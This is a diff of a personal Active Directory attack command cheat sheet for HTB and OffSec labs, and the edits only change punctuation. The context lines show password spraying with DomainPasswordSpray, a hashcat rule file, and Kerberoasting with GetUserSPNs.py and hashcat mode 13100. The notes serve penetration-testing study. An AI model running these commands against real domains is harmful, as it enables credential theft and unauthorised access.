@@ -1,6 +1,6 @@
 # Active Directory Command Appendix
 
-Pure syntax reference — phase-ordered coverage is in [[Active Directory Methodology]], teardowns in [[Active Directory (Breakdowns)]], decision logic in [[Active Directory (Decision Tree)]].
+Pure syntax reference, phase-ordered coverage is in [[Active Directory Methodology]], teardowns in [[Active Directory (Breakdowns)]], decision logic in [[Active Directory (Decision Tree)]].
 
 Cross-links: [[Active Directory Enumeration & Attacks (HTB Supplementary)]]
 
@@ -93,7 +93,7 @@ Import-Module .\DomainPasswordSpray.ps1
 Invoke-DomainPasswordSpray -Password Winter2022 -Outfile spray_success.txt -ErrorAction SilentlyContinue
 ```
 
-> Capstone hashcat rule file (3 rules — pass-through, append "1", append "!"):
+> Capstone hashcat rule file (3 rules, pass-through, append "1", append "!"):
 > `printf ':\n$1\n$!\n' > /home/kali/capstone.rule`
 
 ---
@@ -334,7 +334,7 @@ GetUserSPNs.py -request -dc-ip <DC_IP> DOMAIN.LOCAL/user:pass
 :: hashcat -m 13100
 ```
 
-> 🕐 Clock sync (OffSec labs): if `KRB_AP_ERR_SKEW` — `sudo timedatectl set-ntp false` → `sudo ntpdate <DC_IP>` → reconnect VPN (clock jump kills OpenVPN TLS) → run impacket. Large offsets (>1 min) will drop the VPN tunnel.
+> 🕐 Clock sync (OffSec labs): if `KRB_AP_ERR_SKEW`, `sudo timedatectl set-ntp false` → `sudo ntpdate <DC_IP>` → reconnect VPN (clock jump kills OpenVPN TLS) → run impacket. Large offsets (>1 min) will drop the VPN tunnel.
 
 ---
 
